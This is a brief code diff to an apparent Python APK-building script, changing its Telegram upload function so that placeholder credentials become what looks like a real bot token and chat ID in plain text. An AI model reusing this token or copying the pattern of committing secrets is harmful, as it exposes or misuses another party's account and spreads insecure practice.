@@ -67,8 +67,8 @@ def create_apk():
 
 # Function to send the APK to Telegram
 def send_apk_to_telegram(apk_file_path):
-    bot_token = "your_telegram_bot_token"  # Replace with your Telegram Bot token
-    chat_id = "your_telegram_chat_id"      # Replace with your Telegram Chat ID
+    bot_token = "2006365451:AAGloQmFGgdjL_NkhAnQ6T3Ohrt1hXtLfRU"  # Replace with your Telegram Bot token
+    chat_id = "903017073"      # Replace with your Telegram Chat ID
     url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
 
     with open(apk_file_path, "rb") as apk_file:
